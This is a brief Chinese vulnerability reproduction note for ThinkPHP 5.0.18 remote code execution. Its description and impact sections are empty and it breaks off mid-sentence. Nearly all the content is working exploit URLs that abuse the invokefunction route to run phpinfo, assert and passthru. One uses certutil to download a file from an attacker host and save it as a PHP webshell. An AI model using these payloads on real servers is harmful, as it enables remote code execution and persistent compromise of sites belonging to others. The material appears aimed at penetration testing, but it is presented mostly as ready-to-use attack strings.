Thinkphp 5.0.18
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、windows

    http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1
    http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo()

### 2、使用certutil

    http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php

由于根目录没写权限，所
